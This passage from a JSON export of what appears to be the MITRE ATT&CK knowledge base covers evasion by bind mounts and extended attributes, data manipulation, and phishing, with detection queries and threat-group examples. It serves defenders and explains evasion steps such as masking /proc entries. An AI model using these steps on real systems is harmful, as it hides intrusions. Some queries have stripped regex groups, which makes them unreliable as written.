      "BPFDoorset's it's process to ignore the following signals;SIGHUP,SIGINT,SIGQUIT,SIGPIPE,SIGCHLD,SIGTTIN, andSIGTTOU.[5]",
      "TheGoldMaxLinux variant has been executed with thenohupcommand to ignore hangup signals and continue to run if the terminal session was terminated.[6]",
      "OSX/Shlayerhas used thenohupcommand to instruct executed payloads to ignore hangup signals.[7]",
      "Sea TurtleexecutedSnappyTCPusing the tool NoHup, which keeps the malware running on a system after exiting the shell or terminal.[8]"
    ]
  },
  "T1564.012": {
    "Name": "Hide Artifacts:File/Path Exclusions",
    "Description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.[1]Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e.,Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also useSecurity Software Discoveryand otherDiscovery/Reconnaissanceactivities to both discover and verify existing exclusions in a victim environment.",
    "Detects": [
      "Monitor for newly constructed files, especially those that are unexpectedly created in folders associated with or spoofing that of trusted applications. Also, consider prioritizing monitoring and analyzing file activity in known file/path exclusions."
    ],
    "Procedure Examples": [
      "Turlahas placedLunarWebinstall files into directories that are excluded from scanning.[2]"
    ]
  },
  "T1564.013": {
    "Name": "Hide Artifacts:Bind Mounts",
    "Description": "Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. It’s commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access.Adversaries may use bind mounts to map either an empty directory or a benign/procdirectory to a malicious process’s/procdirectory. Using the commandsmount –o bind /proc/benign-process /proc/malicious-process(ormount –B), the malicious process's/procdirectory is overlayed with the contents of a benign process's/procdirectory. When system utilities query process activity, such aspsandtop, the kernel follows the bind mount and presents the benign directory’s contents instead of the malicious process's actual/procdirectory. As a result, these utilities display information that appears to come from the benign process, effectively hiding the malicious process's metadata, executable, or other artifacts from detection.[1][2]",
    "Detects": [
      "Configure auditd rules to monitor use of the/bin/mountcommand, especially with relation to the/procdirectory.Analytic 1 - Use of Mount with bind arguments targeting /proc/ pathsindex=linux_logs source=\"/var/log/audit/audit.log\"| eval syscall=coalesce(syscall, \"unknown\"), exe=coalesce(exe, \"unknown\")| search syscall=\"mount\" exe=\"/bin/mount\" (msg=\"bind\" OR msg=\"bind,rw\")| rex field=msg \"a0=\\\"(?[^\\\"]+)\\\" a1=\\\"(?[^\\\"]+)\\\"\"| where like(source_path, \"/proc/%\") AND like(target_path, \"/proc/%\")| eval is_suspicious=if(match(target_path, \"/proc/[1-9][0-9]*\") AND NOT cidrmatch(source_path, target_path), 1, 0)| stats count by exe, source_path, target_path, uid, pid, is_suspicious| where is_suspicious=1",
      "Monitor for the creation of PID directories under/procwith unusual characteristics. For example, these directories should typically be read-only; the creation of a directory with write permissions may indicate unusual activity.[4]",
      "Configure auditd rules to monitor use of themountsystem call, especially with respect to the/procdirectory. Bind mount activity invokesmount()with theMS_BINDflag.Analytic 1 - Using eBPF or sys call loggingindex=syscalls source=\"/var/log/audit/audit.log\"| search syscall=\"mount\"| regex args=\".bind.\"| eval suspicious=if(like(args, \"%/proc/%\") AND like(args, \"%bind%\"), 1, 0)| stats count by pid, exe, args, uid, suspicious| where suspicious=1"
    ],
    "Procedure Examples": [
      "KV Botnet Activityleveraged a bind mount to bind itself to the/proc/file path before deleting its files from the/tmp/directory.[3]"
    ]
  },
  "T1564.014": {
    "Name": "Hide Artifacts:Extended Attributes",
    "Description": "Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools likeFinder,ls, orcatand require utilities such asxattr(macOS) orgetfattr(Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such asuser.(user permissions),trusted.(root permissions),security., andsystem., each with specific permissions. On macOS, xattrs are flat strings without namespace prefixes, commonly prefixed withcom.apple.*(e.g.,com.apple.quarantine,com.apple.metadata:_kMDItemUserTags) and used by system features like Gatekeeper and Spotlight.[1]An adversary may leverage xattrs by embedding a second-stage payload into the extended attribute of a legitimate file. On macOS, a payload can be embedded into a custom attribute using thexattrcommand. A separate loader can retrieve the attribute withxattr -p, decode the content, and execute it using a scripting interpreter. On Linux, an adversary may usesetfattrto write a payload into theuser.namespace of a legitimate file. A loader script can later extract the payload withgetfattr --only-values, decode it, and execute it using bash or another interpreter. In both cases, because the primary file content remains unchanged, security tools and integrity checks that do not inspect extended attributes will observe the original file hash, allowing the malicious payload to evade detection.[2]",
    "Detects": [
      "Monitor for execution ofxattrorgetfattrused to read extended attributes, immediately followed by interpreters or loaders (e.g., bash, python, perl, sh, base64) that appear to consume the output. In some cases,setfattris used to modify the extended attributes.",
      "Monitor for the presence of custom extended attributes not whitelisted based on developer workflows.",
      "Detect execution of interpreters or loaders such as bash, sh, osascript, or python that are spawned shortly after a process reading extended attributes (e.g.,xattr,getfattr) within the same parent process or session."
    ],
    "Procedure Examples": [
      "During artifact review, packaging, or deployment stages, scan extended attributes alongside file contents to detect hidden payloads, obfuscated data, or suspicious attribute keys that may indicate malicious behavior."
    ]
  },
  "T1565": {
    "Name": "Data Manipulation",
    "Description": "Adversaries may insert, delete, or manipulate data in order to influence external outcomes or hide activity, thus threatening the integrity of the data.[1]By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "Detects": [
      "Monitor for newly constructed files in order to manipulate external outcomes or hide activity",
      "Monitor for unexpected deletion of a file in order to manipulate external outcomes or hide activity",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc that would aid in the manipulation of data to hide activity",
      "Monitor for unexpected files with manipulated data in order to manipulate external outcomes or hide activity",
      "Monitor for networks that solicits and obtains the configuration information of the queried device.",
      "Monitor for network traffic originating from unknown/unexpected hardware devices.",
      "Monitor for API calls associated with altering data. Remote access tools with built-in features may interact directly with the Windows API to gather information."
    ],
    "Procedure Examples": [
      "FIN13has injected fraudulent transactions into compromised networks that mimic legitimate behavior to siphon off incremental amounts of money.[1]"
    ]
  },
  "T1565.001": {
    "Name": "Data Manipulation:Stored Data Manipulation",
    "Description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.[1][2]By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "Detects": [
      "Monitor for newly constructed files in order to manipulate external outcomes or hide activity",
      "Monitor for unexpected deletion of a file in order to manipulate external outcomes or hide activity",
      "Monitor for unexpected files with manipulated data in order to manipulate external outcomes or hide activity"
    ],
    "Procedure Examples": [
      "APT38has used DYEPACK to create, delete, and alter records in databases used for SWIFT transactions.[1]",
      "MultiLayer Wiperchanges the original path information of deleted files to make recovery efforts more difficult.[3]",
      "SUNSPOTcreated a copy of the SolarWinds Orion software source file with a.bkextension to backup the original content, wroteSUNBURSTusing the same filename but with a.tmpextension, and then movedSUNBURSTusingMoveFileExto the original filename with a.csextension so it could be compiled within Orion software.[4]"
    ]
  },
  "T1565.002": {
    "Name": "Data Manipulation:Transmitted Data Manipulation",
    "Description": "Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity, thus threatening the integrity of the data.[1][2]By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Manipulation may be possible over a network connection or between system processes where there is an opportunity deploy a tool that will intercept and change information. The type of modification and the impact it will have depends on the target transmission mechanism as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "Detects": [
      "Monitor for networks that solicits and obtains the configuration information of the queried device.",
      "Monitor for network traffic originating from unknown/unexpected hardware devices.",
      "Monitor for API calls associated with altering data. Remote access tools with built-in features may interact directly with the Windows API to gather information."
    ],
    "Procedure Examples": [
      "APT38has used DYEPACK to manipulate SWIFT messages en route to a printer.[1]",
      "LightNeuronis capable of modifying email content, headers, and attachments during transit.[3]",
      "Melcozcan monitor the clipboard for cryptocurrency addresses and change the intended address to one controlled by the adversary.[4]",
      "Metamorfohas a function that can watch the contents of the system clipboard for valid bitcoin addresses, which it then overwrites with the attacker's address.[5][6]"
    ]
  },
  "T1565.003": {
    "Name": "Data Manipulation:Runtime Data Manipulation",
    "Description": "Adversaries may modify systems in order to manipulate the data as it is accessed and displayed to an end user, thus threatening the integrity of the data.[1][2]By manipulating runtime data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Adversaries may alter application binaries used to display data in order to cause runtime manipulations. Adversaries may also conductChange Default File AssociationandMasqueradingto cause a similar effect. The type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
    "Detects": [
      "Monitor for newly constructed files in order to manipulate external outcomes or hide activity",
      "Monitor for unexpected deletion of a file in order to manipulate external outcomes or hide activity",
      "Monitor for contextual data about a file, which may include information such as name, the content (ex: signature, headers, or data/media), user/owner, permissions, etc that would aid in the manipulation of data to hide activity",
      "Monitor for unexpected files with manipulated data in order to manipulate external outcomes or hide activity",
      "Monitor for API calls associated with altering data. Remote access tools with built-in features may interact directly with the Windows API to gather information."
    ],
    "Procedure Examples": [
      "APT38has used DYEPACK.FOX to manipulate PDF data as it is accessed to remove traces of fraudulent SWIFT transactions from the data displayed to the end user.[1]"
    ]
  },
  "T1566": {
    "Name": "Phishing",
    "Description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g.,Email Hiding Rules).[1][2]Another way to accomplish this is byEmail Spoofing[3]the identity of the sender, which can be used to fool both the human recipient as well as automated security tools,[4]or by including the intended target as a party to an existing email thread that includes malicious files or links (i.e., \"thread hijacking\").[5]Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,[6][7]or install adversary-accessible remote management tools onto their computer (i.e.,User Execution).[8]",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may send phishing messages to gain access to victim systems. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[20][21]URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.Monitor call logs from corporate devices to identify patterns of potential voice phishing, such as calls to/from known malicious phone numbers. Correlate these records with system events.Analytic 1 - Detecting Malicious Phishing Emails(source=\"o365_message_trace\" OR source=\"gmail_security_logs\" OR source=\"/var/log/maillog\")| search (\"dkim=fail\" OR \"spf=fail\" OR \"dmarc=fail\" OR \"suspicious attachment\")| eval risk_score=case(    like(subject, \"%password reset%\"), 8,    like(subject, \"%urgent action required%\"), 7,    like(subject, \"%invoice%\"), 6)| where risk_score >= 6| stats count by _time, src_email, dest_email, subject, attachment_name, risk_score",
      "Monitor for creation of suspicious email attachments in download directories, execution of phishing attachments (e.g., .docm, .lnk, .hta, .vbs), or files extracted from .zip, .rar, .iso containers that execute scripts.Analytic 1 - Detecting Malicious File Creation from Phishing Emails(EventCode=11 OR EventCode=1116)OR (source=\"/var/log/audit/audit.log\" SYSCALL=\"open\" path IN (\"/home/user/Downloads\", \"C:\\Users\\Public\\Downloads\"))| eval risk_score=case(    like(path, \"%.vbs\"), 8,    like(path, \"%.lnk\"), 7,    like(path, \"%.exe\"), 6)| where risk_score >= 6| stats count by _time, host, path, user, risk_score",
      "Monitor for clicking on malicious links leading to credential phishing, traffic to newly registered or suspicious domains, malicious redirect chains embedded in emails, or downloading of executables from phishing sites.Analytic 1 - Detecting Phishing Link Clicks in Emails(EventCode=3)OR (source=\"zeek_http_logs\" uri IN (malicious_url_list))OR (source=\"proxy_logs\" url IN (malicious_url_list))| eval risk_score=case(    domain IN (\"bit.ly\", \"tinyurl.com\"), 8,    domain IN (\".xyz\", \".top\"), 7,    uri IN (malicious_url_list), 9)| where risk_score >= 7| stats count by _time, host, user, uri, domain, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.Analytic 1 - Detecting Malicious Network Traffic Post-Phishing Execution(EventCode=3)OR (source=\"zeek_conn.log\" dest_ip IN (malicious_ip_list))OR (source=\"proxy_logs\" url IN (malicious_url_list))| eval risk_score=case(    dest_ip IN (malicious_ip_list), 9,    dest_port IN (4444, 1337, 8080), 8,    user_agent LIKE \"%curl%\", 7)| where risk_score >= 7| stats count by _time, host, user, dest_ip, dest_port, risk_score"
    ],
    "Procedure Examples": [
      "Axiomhas used spear phishing to initially compromise victims.[9][10]",
      "GOLD SOUTHFIELDhas conducted malicious spam (malspam) campaigns to gain access to victim's machines.[11]",
      "Hikithas been spread through spear phishing.[10]",
      "INC Ransomhas used phishing to gain initial access.[12][13]",
      "INC Ransomwarecampaigns have used spearphishing emails for initial access.[13]",
      "Kimsukyhas used spearphishing to gain initial access and intelligence.[14][15]",
      "Royalhas been spread through the use of phishing campaigns including \"call back phishing\" where victims are lured into calling a number provided through email.[16][17][18]",
      "Sea Turtleused spear phishing to gain initial access to victims.[19]"
    ]
  },
  "T1566.001": {
    "Name": "Phishing:Spearphishing Attachment",
    "Description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely uponUser Executionto gain execution.[1]Spearphishing may also involve social engineering techniques, such as posing as a trusted source.There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.",
    "Detects": [
      "Monitor for third-party application logging, messaging, and/or other artifacts that may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.[275][276]Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Monitor for suspicious descendant process spawning from Microsoft Office and other productivity software.[277]Analytic 1 - Detecting Phishing Emails with Malicious Attachments(source=\"o365_audit\" OR source=\"gmail_logs\" OR source=\"email_gateway\")| where (spf=\"fail\" OR dkim=\"fail\" OR dmarc=\"fail\")| where (attachment IN (\"docm\", \"exe\", \"vbs\", \"js\", \"zip\"))| where (subject=\"invoice\" OR subject=\"urgent action required\" OR subject=\"account security update\")| eval risk_score=case(    spf=\"fail\" AND dkim=\"fail\", 9,    attachment IN (\"exe\", \"js\", \"vbs\"), 8,    subject IN (\"invoice\", \"security update\"), 7)| where risk_score >= 7| stats count by _time, sender, recipient, subject, risk_score",
      "Monitor for newly constructed files from a spearphishing emails with a malicious attachment in an attempt to gain access to victim systems.Analytic 1 - Detecting Malicious Email Attachments Creating Files(EventCode=11 OR source=\"/var/log/audit/audit.log\" type=\"open\")| where (file_type IN (\"exe\", \"vbs\", \"js\", \"docm\", \"lnk\"))| where (process_path=\"C:\\Users\\\\Downloads\\\" OR process_path=\"/home//Downloads/\")| eval risk_score=case(    like(file_name, \"%.exe\"), 8,    like(file_name, \"%.js\"), 9,    like(file_name, \"%.vbs\"), 7)| where risk_score >= 7| stats count by _time, host, user, file_name, process_path, risk_score",
      "Monitor for clicks on phishing links leading to credential harvesting, traffic to newly registered or suspicious domains, hidden redirect chains embedded in phishing emails, or downloads of secondary payloads from phishing domains.Analytic 1 - Detecting Phishing URL Clicks(EventCode=3)OR (source=\"zeek_http_logs\" uri IN (malicious_url_list))OR (source=\"proxy_logs\" url IN (malicious_url_list))| eval risk_score=case(    domain IN (\"bit.ly\", \"tinyurl.com\"), 8,    domain IN (\".xyz\", \".top\"), 7,    uri IN (malicious_url_list), 9)| where risk_score >= 7| stats count by _time, host, user, uri, domain, risk_score",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "During the2015 Ukraine Electric Power Attack,Sandworm Teamobtained their initial foothold into many IT systems using Microsoft Office attachments delivered through phishing emails.[2]",
      "admin@338has sent emails with malicious Microsoft Office documents attached.[3]",
      "The primary delivered mechanism forAgent Teslais through email phishing messages.[4]",
      "Ajax Security Teamhas used personalized spearphishing attachments.[5]",
      "Andarielhas conducted spearphishing campaigns that included malicious Word or Excel attachments.[6][7]",
      "AppleSeedhas been distributed to victims through malicious e-mail attachments.[8]",
      "APT-C-36has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway.[9]",
      "APT1has sent spearphishing emails containing malicious attachments.[10]",
      "APT12has sent emails with malicious Microsoft Office documents and PDFs attached.[11][12]",
      "APT19sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.[13]",
      "APT28sent spearphishing emails containing malicious Microsoft Office and RAR attachments.[14][15][16][17][18][19][20][21]",
      "APT29has used spearphishing emails with an attachment to deliver files with exploits to initial victims.[22][23][24][25]",
      "APT30has used spearphishing emails with malicious DOC attachments.[26]",
      "APT32has sent spearphishing emails with a malicious executable disguised as a document or spreadsheet.[27][28][29][30][31][32]",
      "APT33has sent spearphishing e-mails with archive attachments.[33]",
      "APT37delivers malware using spearphishing emails with malicious HWP attachments.[34][35][36]",
      "APT38has conducted spearphishing campaigns using malicious email attachments.[37]",
      "APT39leveraged spearphishing emails with malicious attachments to initially compromise victims.[38][39][40]",
      "APT41sent spearphishing emails with attachments such as compiled HTML (.chm) files to initially compromise their victims.[41]",
      "Astarothhas been delivered via malicious e-mail attachments.[42]",
      "BADFLICKhas been distributed via spearphishing campaigns containing malicious Microsoft Word documents.[43]",
      "Bandookis delivered via a malicious Word document inside a zip file.[44]",
      "Bisonalhas been delivered as malicious email attachments.[45]",
      "BITTERhas sent spearphishing emails with a malicious RTF document or Excel spreadsheet.[46][47]",
      "BlackTechhas used spearphishing e-mails with malicious password-protected archived files (ZIP or RAR) to deliver malware.[48][49]",
      "BLINDINGCANhas been delivered by phishing emails containing malicious Microsoft Office documents.[50]",
      "BRONZE BUTLERused spearphishing emails with malicious Microsoft Word attachments to infect victims.[51][52]",
      "Bumblebeehas gained execution through luring users into opening malicious attachments.[53][54][55][56]",
      "DuringC0011,Transparent Tribesent malicious attachments via email to student targets in India.[57]",
      "ForC0015, security researchers assessed the threat actors likely used a phishing campaign to distribute a weaponized attachment to victims.[58]",
      "Chaeshas been delivered by sending victims a phishing email containing a malicious .docx file.[59]",
      "Clamblinghas been delivered to victim's machines through malicious e-mail attachments.[60]",
      "Cobalt Grouphas sent spearphishing emails with various attachment types to corporate and personal email accounts of victim organizations. Attachment types have included .rtf, .doc, .xls, archives containing LNK files, and password protected archives containing .exe and .scr executables.[61][62][63][64][65][66][67][68]",
      "Confuciushas crafted and sent victims malicious attachments to gain initial access.[69]",
      "CURIUMhas used phishing with malicious attachments for initial access to victim environments.[70]",
      "DanBothas been distributed within a malicious Excel attachment via spearphishing emails.[71]",
      "DarkGatecan be distributed through emails with malicious attachments from a spoofed email address.[72]",
      "Darkhotelhas sent spearphishing emails with malicious RAR and .LNK attachments.[73][74]",
      "DarkHydrushas sent spearphishing emails with password-protected RAR archives containing malicious Excel Web Query files (.iqy). The group has also sent spearphishing emails that contained malicious Microsoft Office documents that use the \"attachedTemplate\" technique to load a template from a remote server.[1][75][76]",
      "DarkTortillahas been distributed via spearphishing emails containing archive attachments, with file types such as .iso, .zip, .img, .dmg, and .tar, as well as through malicious documents.[77]",
      "DarkWatchmanhas been delivered via spearphishing emails that contain a malicious zip file.[78]",
      "Dragonflyhas sent emails with malicious attachments to gain initial access.[79]",
      "Elderwoodhas delivered zero-day exploits and malware to victims via targeted emails containing malicious attachments.[80][81]",
      "Emotethas been delivered by phishing emails containing attachments.[82][83][84][85][86][87][88][89][90]",
      "EnvyScouthas been distributed via spearphishing as an email attachment.[91]",
      "EXOTIC LILYconducted an e-mail thread-hijacking campaign with malicious ISO attachments.[92][53]",
      "Ferocious Kittenhas conducted spearphishing campaigns containing malicious documents to lure victims to open the attachments.[93]",
      "FIN4has used spearphishing emails containing attachments (which are often stolen, legitimate documents sent from compromised accounts) with embedded malicious macros.[94][95]",
      "FIN6has targeted victims with e-mails containing malicious attachments.[96]",
      "FIN7sent spearphishing emails with either malicious Microsoft Documents or RTF files attached.[97][98][99][100][101]",
      "FIN8has distributed targeted emails containing Word documents with embedded malicious macros.[102][103][104]",
      "Flagprohas been distributed via spearphishing as an email attachment.[49]",
      "DuringFrankenstein, the threat actors likely used spearphishing emails to send malicious Microsoft Word documents.[105]",
      "Gallmakersent emails with malicious Microsoft Office documents attached.[106]",
      "Gamaredon Grouphas delivered spearphishing emails with malicious attachments to targets.[107][108][109][110][111][112][113]",
      "Gorgon Groupsent emails to victims with malicious Microsoft Office documents attached.[114]",
      "Hancitorhas been delivered via phishing emails with malicious attachments.[115]",
      "Higaisahas sent spearphishing emails containing malicious attachments.[116][117]",
      "IcedIDhas been delivered via phishing e-mails with malicious attachments.[118][119]",
      "Inceptionhas used weaponized documents attached to spearphishing emails for reconnaissance and initial compromise.[120][121][122][123]",
      "IndigoZebrasent spearphishing emails containing malicious password-protected RAR attachments.[124][125]",
      "Javalihas been delivered as malicious e-mail attachments.[42]",
      "JSS Loaderhas been delivered by phishing emails containing malicious Microsoft Excel attachments.[100]",
      "Kerrdownhas been distributed through malicious e-mail attachments.[32]",
      "Kimsukyhas used emails containing Word, Excel and/or HWP (Hangul Word Processor) documents in their spearphishing campaigns.[126][127][128][129][130][8][131][132]",
      "KOCTOPUShas been distributed via spearphishing emails with malicious attachments.[133]",
      "KONNIhas been delivered via spearphishing campaigns through a malicious Word document.[134]",
      "KOPILUWAKhas been delivered to victims as a malicious email attachment.[135]",
      "Latrodectushas been distributed through reply-chain phishing emails with malicious attachments.[136]",
      "Lazarus Grouphas targeted victims with spearphishing emails containing malicious Microsoft Word documents.[137][138][139][140]",
      "LazyScripterhas used spam emails weaponized with archive or document files as its initial infection vector.[133]",
      "Leviathanhas sent spearphishing emails with malicious attachments, including .rtf, .doc, and .xls files.[141][142]",
      "Lokibotis delivered via a malicious XLS attachment contained within a spearhpishing email.[143]",
      "Lumma Stealerhas been delivered through phishing emails with malicious attachments.[144]",
      "Machetehas delivered spearphishing emails that contain a zipped file with malicious contents.[145][146][147]",
      "Malteirohas sent spearphishing emails containing malicious .zip files.[148]",
      "menuPasshas sent malicious Office documents via email as part of spearphishing campaigns as well as executables disguised as documents.[149][150][151][152]",
      "Metamorfohas been delivered to victims via emails with malicious HTML attachments.[153][154]",
      "Mofangdelivered spearphishing emails with malicious documents, PDFs, or Excel files attached.[155]",
      "Moleratshas sent phishing emails with malicious Microsoft Word and PDF attachments.[156][157][158]",
      "Moonstone Sleetdelivered various payloads to victims as spearphishing attachments.[159]",
      "MuddyWaterhas compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments to recipients.[160][161][162][163][164][165][166][167]",
      "Mustang Pandahas used spearphishing attachments to deliver initial access payloads.[168][169][170]",
      "Naikonhas used malicious e-mail attachments to deliver malware.[171]",
      "NETWIREhas been spread via e-mail campaigns utilizing malicious attachments.[172][173]",
      "Nomadic Octopushas targeted victims with spearphishing emails containing malicious attachments.[174][175]",
      "OceanSalthas been delivered via spearphishing emails with Microsoft Office attachments.[176]",
      "Octopushas been delivered via spearsphishing emails.[175]",
      "OilRighas sent spearphising emails with malicious attachments to potential victims using compromised and/or spoofed email accounts.[177][178][179][180]",
      "DuringOperation Dream Job,Lazarus Groupsent emails with malicious attachments to gain unauthorized access to targets' computers.[181][182]",
      "DuringOperation Dust Storm, the threat actors sent spearphishing emails that contained a malicious Microsoft Word document.[183]",
      "DuringOperation Spalax, the threat actors sent phishing emails that included a PDF document that in some cases led to the download and execution of malware.[184]",
      "OutSteelhas been distributed as a malicious attachment within a spearphishing email.[185]",
      "Patchworkhas used spearphishing with an attachment to deliver files with exploits to initial victims.[186][187][188][189]",
      "PLATINUMhas sent spearphishing emails with attachments to victims as its primary initial access vector.[190]",
      "PoetRATwas distributed via malicious Word documents.[191]",
      "Ponyhas been delivered via spearphishing attachments.[192]",
      "QakBothas spread through emails with malicious attachments.[193][194][195][196][197][198][199][200][201]",
      "Ramsayhas been distributed through spearphishing emails with malicious attachments.[202]",
      "Rancorhas attached a malicious document to an email to gain initial access.[203]",
      "RedCurlhas used phishing emails with malicious files to gain initial access.[204][205]",
      "Mustang Pandaleveraged malicious attachments in spearphishing emails for initial access to victim environments inRedDelta Modified PlugX Infection Chain Operations.[206]",
      "REvilhas been distributed via malicious e-mail attachments including MS Word Documents.[207][208][209][210][211]",
      "Rifdoorhas been distributed in e-mails with malicious Excel or Word documents.[212]",
      "ROKRAThas been delivered via spearphishing emails that contain a malicious Hangul Office or Microsoft Word document.[213]",
      "RTMhas been delivered via spearphishing attachments disguised as PDF documents.[214]",
      "RTMhas used spearphishing attachments to distribute its malware.[215]",
      "Saint Bearuses a variety of file formats, such as Microsoft Office documents, ZIP archives, PDF documents, and other items as phishing attachments for initial access.[185]",
      "Saint Bothas been distributed as malicious attachments within spearphishing emails.[216][185]",
      "Sandworm Teamhas delivered malicious Microsoft Office and ZIP file attachments via spearphishing emails.[217][218][219][220][221][222]",
      "SideCopyhas sent spearphishing emails with malicious hta file attachments.[223]",
      "Sidewinderhas sent e-mails with malicious attachments often crafted for specific targets.[224]",
      "Silencehas sent emails with malicious DOCX, CHM, LNK and ZIP attachments.[225][226][227]",
      "Snip3has been delivered to victims through malicious e-mail attachments.[228]",
      "Squirrelwafflehas been distributed via malicious Microsoft Office documents within spam emails.[229]",
      "Star Blizzardhas sent emails with malicious .pdf files to spread malware.[230]",
      "StrelaStealerhas been distributed as a spearphishing attachment.[231]",
      "SVCReadyhas been distributed via spearphishing campaigns containing malicious Mircrosoft Word documents.[232]",
      "TA2541has sent phishing emails with malicious attachments for initial access including MS Word documents.[233][234]",
      "TA459has targeted victims using spearphishing emails with malicious Microsoft Word attachments.[235]",
      "TA505has used spearphishing emails with malicious attachments to initially compromise victims.[236][237][238][239][240][241][242][243][244]",
      "TA551has sent spearphishing attachments with password protected ZIP files.[245][246][247]",
      "Taidoorhas been delivered through spearphishing emails.[248]",
      "The White Companyhas sent phishing emails with malicious Microsoft Word attachments to victims.[249]",
      "Threat Group-3390has used e-mail to deliver malicious attachments to victims.[60]",
      "ThreatNeedlehas been distributed via a malicious Word document within a spearphishing email.[138]",
      "Tonto Teamhas delivered payloads via spearphishing attachments.[250]",
      "Transparent Tribehas sent spearphishing e-mails with attachments to deliver malicious payloads.[251][252][253][254][255]",
      "TrickBothas used an email with an Excel sheet containing a malicious macro to deploy the malware[256]",
      "Tropic Troopersent spearphishing emails that contained malicious Microsoft Office and fake installer file attachments.[257][258][259][260][261]",
      "Valakhas been delivered via spearphishing e-mails with password protected ZIP files.[245]",
      "WarzoneRAThas been distributed as a malicious attachment within an email.[262][69]",
      "Water Curupira Pikabot Distributionattached password-protected ZIP archives to deliverPikabotinstallers.[263]",
      "Windshifthas sent spearphishing emails with attachment to harvest credentials and deliver malware.[264]",
      "Winter Vivernleverages malicious attachments delivered via email for initial access activity.[265][266][267]",
      "WIRTEhas sent emails to intended victims with malicious MS Word and Excel attachments.[268]",
      "Wizard Spiderhas used spearphishing attachments to deliver Microsoft documents containing macros or PDFs containing malicious links to download eitherEmotet, Bokbot,TrickBot, orBazar.[269][270][271]",
      "Woody RAThas been delivered via malicious Word documents and archive files.[272]",
      "XLoaderhas been delivered as a phishing attachment, including PDFs with embedded links, Word and Excel files, and various archive files (ZIP, RAR, ACE, and ISOs) containing EXE payloads.[273][274]",
      "ZxxZhas been distributed via spearphishing emails, usually containing a malicious RTF or Excel attachment.[46]"
    ]
  },
  "T1566.002": {
    "Name": "Phishing:Spearphishing Link",
